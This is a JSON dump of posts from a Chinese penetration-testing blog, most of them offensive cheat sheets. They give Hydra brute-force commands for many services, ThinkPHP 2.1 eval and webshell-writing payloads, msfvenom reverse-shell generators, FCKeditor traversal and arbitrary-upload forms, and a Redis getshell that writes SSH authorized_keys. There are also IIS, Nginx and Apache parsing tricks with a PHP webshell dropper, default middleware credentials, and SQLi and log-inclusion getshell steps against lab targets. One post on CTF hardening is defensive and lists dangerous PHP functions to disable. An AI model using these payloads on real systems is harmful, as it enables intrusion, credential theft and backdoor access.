cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等\n      ○ OPT\n  ● 可选项\n\n爆破ssh\nhydra ip ssh -l 用户名  -P 密码文件 - V显示过程 \n\n爆破ftp\nhydra ip ftp -l 用户名  -P 密码文件 - V显示过程 \n\n爆破telnet\n      hydra ip telnet -l 用户名  -P 密码文件 - V显示过程\n\n爆破rdp\n      hydra ip rdp -l 用户名  -P 密码文件 - V显示过程 \n\n爆破http[get]\n hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/\n hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php\n爆破http[post]\n hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”\n爆破cisco\nhydra -P pass.txt 10.36.16.18 cisco\n    hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n爆破 smb\n    hydra -l administrator -P pass.txt 10.36.16.18 smb\n爆破pop3\nhydra -l muts -P passx`.txt my.pop3.mail pop3\n爆破http-proxy\nhydra -l admin -P pass.txt http-proxy://10.36.16.18\n```\n\n","tags":["kali Hydra"],"categories":["kali"]},{"title":"ThinkPHP2.1命令执行漏洞","url":"/2017/08/29/ThinkPHP2.1命令执行漏洞/","content":"## ThinkPHP 2.1 命令执行漏洞 \n###   使用了preg_replace() +/e模式  导致命令执行\n      ○ http://192.168.20.70/index.php/Index/index/name/${@print(eval($_POST[zng]))} eval 可以改成phpinfo()\n      \n      ○ {${exit(print(getcwd()))};}\n      \n      ○ http://localhost/code.php?data={${eval($_POST[1])};} 一句话木马\n      \n      ○ http://localhost/code.php?data={${exit(print(getcwd()))};}\n      获取工作路径\n      \n      ○ http://localhost/code.php?data={${exit(var_dump(file_get_contents($_POST[f])))};}\n      \n      ○ POST 方式读取文件 利用火狐 hackbar 插件 Enable Post data 参数 f=文件名\n      ○ http://localhost/code.php?data={${exit(var_dump(file_put_contents($_POST[f],$_POST[d])))};}\n      \n      ○ POST 方式读取文件 利用火狐 hackbar 插件 Enable Post data 参数 f=文件名，d 是数据\n      ○ 参数形式是 f=文件名&d=内容\n      ○ 漏洞利用\n      ○ \t{${eval($_POST[1])} ;} 一句话\n      ○ \t{${exit(print(getcwd()))};} 获取当前工作路径\n      ○ \t{${exit(var_dump(file_get_contents($_POST[f])))}} 读文件 f=/etc/passwd \n      ○ \t{${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))}}\n      ○ \t写 webshell f=1.php&d=1111111\n      ○ \tintext:thinkphp intext:\"Fast & Simple OOP PHP Framework\" intext:\"2.1\"\n      ○ \t${@print(eval($_POST[1]))}\n      ○ \t{${@eval($_POST[1])}}","tags":["漏洞"],"categories":["vuln"]},{"title":"Linux学习笔记","url":"/2017/08/29/linux学习笔记/","content":"\n# Linux学习笔记\n\n## 查看系统版本 \n\n\n```\n1、uname -a \nLinux zng-virtual-machine 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:27 UT\n\n    4 代表是大版本\n    2 代表次版本  如何为奇数则代表为测试版本   会不稳定\n2、lsb_release -a\n    No LSB modules are available.\n    Distributor ID:\tUbuntu\n    Description:\tUbuntu 14.04.5 LTS\n    Release:\t14.04\n    Codename:\ttrusty\n```\n\n## 3、ssh连接\n\n\n```\nsudo apt-get install openssh-server\n\nvim /etc/ssh/sshd_cofig\n\nPermitRootLogin yes   //允许root用户登陆\n\n/etc/init.d/ssh restart //重启ssh\n\n禁止人家使用ssh端口登录就行了，具体方法\n：\nsudo vi /etc/ssh/sshd_config\n\n查找 AllowUsers ，如果没有则加上。\nAllowUsers meiking root\n\n上面表达的意思就是只允许meiking和root用户远程登录\n```\n\n## 4、ftp链接\n\n\n```\napt-get install vsftp   //安装vsftp\nsudo mkdir /home/uftp   //建立ftp用户目录\nsudo useradd -d /home/uftp -s /bin/bash uftp    新建uftp用户   \nsudo passwd uftp    //修改uftp密码\n打开\"终端窗口\"，输入\"sudo gedit /etc/vsftpd.conf\"-->回车-->打开了vsftpd.conf文件，向文件中添加\"userlist_deny=NO   添加规则\nuserlist_enable=YES userlist_file=/etc/allowed_users\"和\"seccomp_sandbox=NO\"-->使文件中的\"local_enable=YES\"-->保存。\nsudo gedit /etc/allowed_users  输入uftp\n```\n\n\n```\n5、touch \n    touch -r 文件     更新时间戳\n6、echo 写shell \n    echo \"\" > 文件\n\n7、nano 文件\n8、gedit 文件\n9、less  文件    可以上下翻页查看  \n  /搜索\n      \tq退出\n10、cat  文件   //查看                  \n     cat -b 文件    //带序号 查看文件\n11、tail 文件  可以实时显示文件 \n  tail -f 文件名    实时显示文件最后的内容  \n  tail -n 显示行数\n12、head 文件  显示文档的开头\n  head -c 文件    显示字节数\n13、ctrl +l 清屏   或者  clear 清屏\n14、wc 文件    统计文件内容的单词数\n\n    第一个 1 代表总行数\n    第二个 1 代表单词数\n    第三个 8 代表占的字节数 即文件大小\n    第四个1.txt  代表文件名\n15、cp 文件  目的路径 \n    cp -r 文件  目的路径  复制目录\n16、linux标准流\n    标准输入流    描述符 0 \n    标准输出流    描述符 1\n    标准错误流    描述符 2\n    eg: find / -name \"php\" 2>/dev/null\n17、cd  目录  \n    cd ~ 进入家/主目录\n    cd - 退回到上一次的目录\n    cd  不加参数 可以直接进入当前家的主目录\n18、chmod \n\n    r  写  4 \n    w 读   2 \n    x  执行  1 \n    s  特殊权限\n\n    chmod a-x 文件 \n    chmod -R \n19、whice  \n    20、如果ifconfig不能使用 则可以使用/sbin/ifconfig使用 这个是临时生效\n    如果长期生效，则需要在/etc/profile 末尾添加 以下代码来永久生效\n    export PATH=$PATH:/sbin\n21、grep\t\n    -v  反转查询\n    -n  输出行号\n    -l 输出匹配的行所在的文件名\n     \t22、sort\n    -n 按照数字大小排序  -n 会忽略空格或者tab缩进\n    -r 降序排序  sort默认升序\n    -f 不区分大小写\n23、ps\n    -a 显示所有的用户进程\n    -x 显示无终端的进程\n    -u 显示更多的信息\n    -e 显示所有进程\n    常用 ps -aux\n    uid 进程所属用户id\n    pid 进程id\n    ppid 父进程id\n    C CPU使用率\n24、kill 命令\n    kill -9 pid\n25、FTP\n    连接：ftp  hostname \n    命令:\n    put filename  本地上传文件到服务器\n    get filename  服务器下载文件到本地\n    mput filelist  多文件上传\n    mget filelist  多文件下载\n    dir   列出所有文件\n    cd 改变远程目录\n    lcd 本地目录\n\n26、df命令\n    df -k 全盘使用的情况\n27、usemod -u 0 -g 用户组   修改用户权限  将用户权限设置为0\n```\n","tags":["linux"],"categories":["linux"]},{"title":"msfvenom生成shell","url":"/2017/08/29/msfvenom生成shell/","content":"\n# Msfvenome 生成各种shell\n\n## 生成32位exe\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.1.106 LPORT=1234 -f exe > ./test.exe\n```\n\n\n## Linux\n##### msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf\n\n\n## Windows\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe\n```\n\n## Mac\n\n```\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho\n```\n\n\n## PHP\n\n```\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php\ncat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php\n```\n\n\n## ASP\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp\n```\n\n# JSP\n\n```\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp\n```\n\n\n## WAR\n\n```\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war\n```\n\n## Python\n\n```\nmsfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py\n```\n\n## Bash\n\n```\nmsfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh\n```\n\n\n## Perl\n\n```\nmsfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl\n```\n","tags":["msfvenom"],"categories":["kali"]},{"title":"Fck编辑器漏洞","url":"/2017/08/29/FCK编辑器漏洞/","content":"\n# Fck编辑器漏洞  \n\n\n### 版本2.6.6\n\n#####   1、突破.变_限制\n\n\n```\neditor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/0x7e.asp&NewFolderName=z&uuid=1244789975684\n```\n\n\n\n##### 2、上传界面 \n\n\n```\neditor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/0x7e.asp&NewFolderName=z&uuid=1244789975684\n\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)\n```\n\n\n\n##### 上传地址 \n\n\n```\nhttp://192.168.20.243/fck266/editor/filemanager/connectors/uploadtest.html\n```\n\n\n#####   FCKeditor 中test 文件的上传地址\n\n\n```\nFCKeditor/editor/filemanager/browser/default/connectors/test.html\nFCKeditor/editor/filemanager/upload/test.html\nFCKeditor/editor/filemanager/connectors/test.html\nFCKeditor/editor/filemanager/connectors/uploadtest.html\n```\n\n\n##### 常用上传地址\n\n\n```\nFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/\nFCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp\n```\n\n\n#####  JSP 版：\n\n```\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp\n```\n\n\n#####  _samples 目录\n\n\n```\nFCKeditor/_samples/default.html\nFCKeditor/_samples/asp/sample01.asp\nFCKeditor/_samples/asp/sample02.asp\nFCKeditor/_samples/asp/sample03.asp\nFCKeditor/_samples/asp/sample04.asp\n```\n\n## 版本2.4.1\n\n##### 修改CurrentFolder 参数使用 ../../来进入不同的目录\n\n```\n/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp\n```\n\n##### 根据返回的XML 信息可以查看网站所有的目录。\n\n```\nFCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F\n```\n\n##### JSP 版本：\n\n```\nFCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F\n```\n\n##### 爆路径漏洞\n\n```\nFCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp\n```\n\n\n##### 版本小于等于2.4.2 For php \n在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。\n\n```\n<form id=\"frmUpload\" enctype=\"multipart/form-data\"\naction=\"http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media\" method=\"post\">Upload a new file:<br>\n<input type=\"file\" name=\"NewFile\" size=\"50\"><br>\n<input id=\"btnUpload\" type=\"submit\" value=\"Upload\">\n</form>\n```\n","tags":["渗透"],"categories":["Web渗透"]},{"title":"Redis未授权访问漏洞getshell","url":"/2017/08/29/Redis未授权访问漏洞/","content":"\n\n# Redis未授权访问漏洞getshell\n    \n\n#### linux下默认没安装redis-cli  kail下也没有 所以要自己安装\n\napt安装：\n\n    \n```\nsudo apt-get install redis-server\n```\n\n源码安装：\n\n一、下载源码并编译\n\n    1、wget http://download.redis.io/releases/redis-2.8.3.tar.gz\n    2、 tar xzf redis-2.8.3.tar.gz\n    3、 cd redis-2.8.3\n    4、make\n二、编译完成后，在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。\n\n\n```\n          mkdir /usr/redis\n          cp redis-server /usr/redis\n          cp redis-benchmark /usr/redis\n          cp redis-cli /usr/redis\n          cp redis.conf /usr/redis\n          cd /usr/redis\n```\n三、启动Redis服务。\n\n          $ redis-server redis.conf\n          \n四、然后用客户端测试一下是否启动成功。\n\n         \n```\n$ redis-cli\n          redis> set foo bar\n          \"OK\"\n          redis> get foo\n          \"bar\"\n```\n\n五、安装完后 开始利用\n\n  需要生成一对ssh key \n  \n      kali下  ssh-keygen -t rsa\n      \n         默认情况下，生成后在用户的家目录下的 .ssh 目录下\n         \n  将生成的公钥的值写入目标服务器\n      (echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") > /tmp/foo.txt\n      \n    cat /tmp/foo.txt | redis-cli -h\n      \n    192.168.1.100 -p 6379 -x set crackit\n          \n    crackit 是设置的 key，可随意指定\n          \n  连接目标机器\n      \n    redis-cli -h 192.168.1.100 -p 6379\n          \n         \n    192.168.1.100:6379> config set dir /root/.ssh/\n          \n    192.168.1.100:6379> config get dir\n      \n        \"dir\"\n        \"/root/.ssh\"\n         \n    192.168.1.100:6379> config set dbfilename \"authorized_keys\"\n      \n    192.168.1.100:6379> save\n      \n    将目录设置为 /root/.ssh/ 目录后，再将备份文件名设置为 authorized_keys，通过 save 指令即可写入文件。\n    \n    \n  通过 ssh 连接目标\n  \nssh root@192.168.1.100 -i ~/.ssh/id_rsa\n          \n     默认会使用id_rsa如果改过文件名则可以用 -i 参数来指定。\n    \n    \n\n    ","tags":["漏洞"],"categories":["vuln"]},{"title":"各种中间件漏洞笔记","url":"/2017/08/29/各种中间件漏洞/","content":"\n\nIIS 6.0解析利用方法有两种：\n \n```\n    ● 1.目录解析\n    建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析\n      ● 2.文件解析\n    后缀解析：/xx.asp;.jpg  /xx.asp:.jpg(此处需抓包修改文件名)\n      ● 3.默认解析：\n    /xx.asa，/xx.cer，/xx.cdx\n```\n\nIIS7.5/ IIS 7.0/ Nginx <8.03畸形解析漏洞\nIIS 7.5的解析漏洞利用手法，在正常图片URL后添加 /.php。\n常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾\n```\n内容 <?PHP fputs(fopen(‘shell.php’,’w’),'<?phpeval($_POST[cmd])?>’);?>\n通过windows下copy命令合成，或者用hex工具直接写也可以\n然后访问xx.jpg/x.php,在这个目录下就会生成一句话木马shell.php\n```\nIIS PUT漏洞\n```\n  ● 2个错误配置造成\n      ○ 1.WEB服务器扩展里设置WebDAV为允许；\n      ○ 2.网站权限配置里开启了写入权限。\n      ○ 使用桂林老兵的工具\nl IIS溢出漏洞\n  ● 开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，针对 Windows Server 2003 R2\n  ● POC: https://github.com/edwardz246003 ... b/master/exploit.py\n ```\n\nApache解析漏洞\n ```\n  ● 后缀解析：test.php.x1.x2.x3\n      ○ Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析\n      ○ test.php.x1.x2.x3 则会被解析为php\n      ○ 经验之谈：php|php3|phtml|php4|php5 多可被Apache解析 \n```\n      \nNginx解析漏洞\n ```\n      ○ Nginx <8.03畸形解析漏洞\n          ■ 直接在正常图片URL后添加 /.php\n ○ Nginx <=0.8.37\n          ■ 在Fast-CGI关闭的情况下，Nginx <=0.8.37 依然存在解析漏洞\n          ■ 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。\n          ■ 这是从 /test.jpg/x.php 演变过来的，具体可以参考：Ngnix空字节可远程执行代码漏洞\n ```\n \nJBOSS存在java反序列化命令执行\n ```\n      ● 端口：8080（Web）、9990（Console）\n      ● 管理面板：http://<host>:9990\n      ● 弱口令\n      ○ jboss:jboss\n      ○ admin:admin\n ```\nWeblogic存在java反序列化命令执行\n ```\n      ● 端口 7001、7002（Web、Console）\n      ● 管理面板：http://<host>:7001/console/\n      ● 弱口令\n          ○ weblogic:weblogic\n          ○ system:system\n          ○ portaladmin:portaladmin\n          ○ guest:guest\n          ○ weblogic:admin123\n          ○ weblogic:weblogic123\n ```\nWebSphere存在java反序列化命令执行\n ```\n      ● 端口：9080、9443（Web）、9060、9043（Console）、…\n      ● 管理面板：\n      ○ http://<host>:7043/ibm/console/logon.jsp\n```\n","tags":["漏洞"],"categories":["vuln"]},{"title":"Web安全靶机实战","url":"/2017/08/29/web安全/","content":"\n# 培训靶机shell :\n\n## metinfo \n\n\n### 漏洞点： 后台上传模版 zip  路径/root/templates/shell.php\n\n```\nshell:http://192.168.20.42/metinfo/templates/zng.php zng\n```\n\n## doyo\n### 漏洞点：：购物那里没有过滤 造成sql注入\n\n\n```\nadmin123 | 18b65462b9f8241e7d66931f6cf1ddf3    passwd(admin123)\n\n报错注入payload :\nquantity%5D=1\"' and updatexml(1,concat(0x7e,database(),0x7e),3) or '\n```\n\n\n\n## 易酷cms   \n### 漏洞点：存在本地文件包含 包含错误日志getshell\n\n\n```\n后台 admin admin888 \n首先访问 index.php?s=my/show/id/{~eval($_POST[x])}\nhttp://test.51lunge.cn/index.php?s=my/show/id/{~eval($_POST[x])}\n然后在包含index.php?s=my/show/id/\\..\\temp\\logs\\17_05_17.log  菜刀链接 密码为x\n\n日志这里修改成今天的日期  17年   05月 17日\n \n\n```\n\n\n\n## phpoa4.0 存在任意文件上传漏洞  \n### 漏洞点：\n    http://192.168.20.42/phpoa/ntko/upLoadOfficeFile.php  没有任何过滤导致任意文件上传，可本地构造上传表单，getshell.\n\n```\n<form action=\"http://192.168.20.42/phpoa/ntko/upLoadOfficeFile.php\" method=\"post\" enctype=\"multipart/form-data\">\n\t\t\t<input type=\"file\" name=\"upLoadFile\"><br/>\n  \n                <input type=\"file\" name=\"attachFile\"><br/>\n  \n                <input type=\"submit\" value=\"submit\">\n</form>\nshell :http://192.168.20.42/phpoa/ntko/uploadAttachFile/zng.php zng\n```\n","tags":["渗透"],"categories":["Web渗透"]},{"title":"CTF线下加固","url":"/2017/08/29/ctf线下加固/","content":"# 一、SSH\n\n```\n  1. passwd 用户   //修改用户密码\n  2. vim /etc/ssh/sshd_config  编辑ssh的配置文件 \n  3. port 12345   ssh端口\n  4. PermitRootLogin no  禁止root远程登陆  \n  5. PermitEmptyPasswords no   禁止使用空密码登陆\n  6. MaxAuthTries 3   限制登陆失败次数 \n  7. AllowUsers user1 user2  只允许指定用户登陆\n\n\n8、在文件系统里找到/etc/network下的interfaces文件，打开后可以看到eth0为dhcp，将其修改为如下形式：\n \n# This file describes the network interfaces available on your system\n # and how to activate them. For more information, see interfaces(5).\n \n# The loopback network interface\nauto lo\n iface lo inet loopback\n \nauto eth0\n iface eth0 inet static                //配置eth0使用默认的静态地址\n address 192.168.77.133        //设置eth0的IP地址\n netmask 255.255.255.0          //配置eth0的子网掩码\n gateway 192.168.77.254        //配置当前主机的默认网关\n\n“interfaces”文件中还有很多其他的设置项，如需要了解更多的信息，可以使用man命令查询“interfaces”文件的手册页。\n #man interfaces\n \n其中eth0指本机以太网卡一，类似的，eth1指本机的以太网卡2。一般一台电脑只有一个eth0。网卡的设备名/dev/eth0 和硬件的MAC 地址52:54:AB:DD:6F:61对应，MAC 地址是生产厂家定的，每个网卡拥有的唯一地址。\n \nlinux下，用ifconfig后，能看到eth0,可能还会看到eth0：1。其中eth0：1是指eth0的分ip存储文件，分ip存储文件格式为ifcfg-eth0：X， X为任意正整数（包括0）\n9、DNS配置\n\n    Kali Linux的DNS服务器地址使用文件“/etc/resovl.conf”进行配置，用户可以通过“nameserver”配置项设置DNS服务器的 IP地址；“resolv.conf”文件中最多可以使用\n“nameserver”指定３个DNS服务器，按照先后的顺序，一旦前面的DNS服务器失效，系统将自动使用后面的DNS服务器。\n      对于“resolv.conf”文件设置“nameserver”的修改是即时生效的，即只要对“resolv.conf”文件的修改进行了保存，在系统下一次需要进行域名的解析时就会按照该文件中指定\n的DNS服务器IP地址进行域名的解析。\n在resolv.conf中的格式如下：\ndomain\nnameserver 10.10.10.10\nnameserver 102.54.16.2\n```\n--------------------------------------------------------------------------------\n\n# 二、Apache配置\n\n```\n1、主配置文件: /etc/httpd/conf/httpd.conf (RHEL/CentOS/Fedora等系统) 或/etc/apache/apache2.conf (Debian/Ubuntu)。\n\n2、对Web服务器的日志文件的访问: /var/log/httpd/access_log。\n\n3、Web服务器错误日志：/var/log/httpd/error_log。\n\n4、目录浏览默认地是被启用的。要禁用这个特性，应编辑http.conf文件，而且对每一个”Directory”指令，应清除”Indexs”。\n操作方法：\n将Options Indexes FollowSymLinks中的Indexes 去掉，就可以禁止 Apache 显示该目录结构。\n\n5、在Apache 服务器的配置文件中进行以下的设置，阻止用户建立、修改 .htaccess文\t件，防止用户超越能定义的系统安全特性。\n .htaccess文件内容：\n            AllowOveride None\n            Options None\n            Allow from all\n6、Apache下禁止指定目录运行PHP脚本\n    1、没有编辑Http的权限可以创建 .htaccess文件\n    \n        RewriteEngine on RewriteCond % !^$\n        RewriteRule uploads/(.*).(php)$ – [F]\n        RewriteRule data/(.*).(php)$ – [F]\n        RewriteRule templets/(.*).(php)$ –[F]\n    2、可以在上传目录创建.htaccess文件的内容可以是\n        <Directory \"/var/www/upload\">\n            <FilesMatch \"\\.(php|php3)$\">\n                Order Allow,Deny\n                Deny from all\n            </FilesMatch>\n        </Directory>\n    3、如果有编辑httpd.conf文件的权限\n        <Directory /var/www/bbs/attachments> \n            <Files ~ \".php\">\n                Order allow,deny \n               Deny from all \n            </Files>\n        </Directory>\n\n\n```\n\n# 三、PHP配置\n\n 1、命令执行漏洞修复 （禁用危险函数）\n    进入php.ini里面找到“disable_functions” 在它后面添加以下函数： \n```\nsystem,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname\n```\n2、跨目录修复（Open_basedir指定参数）\n\n```\nopen_basedir可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径，也 \n可用符号\".\"来代表当前目录。注意用open_basedir指定的限制实际上是前缀,而不是目录名。 \n举例来说: 若\"open_basedir = /dir/user\", 那么目录 \"/dir/user\" 和 \"/dir/user1\"都是 \n可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。例如设置成: \n\"open_basedir = /dir/user/\" \n\nopen_basedir也可以同时设置多个目录, 在Windows中用分号分隔目录,在任何其它系统中用 \n冒号分隔目录。当其作用于Apache模块时，父目录中的open_basedir路径自动被继承。 \n\n有三种方法可以在Apache中为指定的用户做独立的设置: \n\n(a) 在Apache的httpd.conf中Directory的相应设置方法: \n\nphp_admin_value open_basedir /usr/local/apache/htdocs/ \n#设置多个目录可以参考如下: \nphp_admin_value open_basedir /usr/local/apache/htdocs/:/tmp/ \n\n\n(b) 在Apache的httpd.conf中VirtualHost的相应设置方法: \nphp_admin_value open_basedir /usr/local/apache/htdocs/ \n#设置多个目录可以参考如下: \nphp_admin_value open_basedir /var/www/html/:/var/tmp/ \n\n(c) 因为VirtualHost中设置了open_basedir之后, 这个虚拟用户就不会再自动继承php.ini \n中的open_basedir设置值了,这就难以达到灵活的配置措施, 所以建议您不要在VirtualHost \n中设置此项限制. 例如,可以在php.ini中设置open_basedir = .:/tmp/, 这个设置表示允许 \n访问当前目录(即PHP脚本文件所在之目录)和/tmp/目录. \n\n请注意: 若在php.ini所设置的上传文件临时目录为/tmp/, 那么设置open_basedir时就必须 \n包含/tmp/,否则会导致上传失败. 新版php则会提示\"open_basedir restriction in effect\" \n警告信息, 但move_uploaded_file()函数仍然可以成功取出/tmp/目录下的上传文件,不知道 \n这是漏洞还是新功能. \n\n针对ShopEx472版本的配置： \n\nopen_basedir = \"D:/Server;../catalog;../include;../../home;../syssite;../templates;../language;../../language;../../../language;../../../../language\"\n\n\n```\n\n\n\n\n \n\n\n","tags":["ctf"],"categories":["ctf"]}]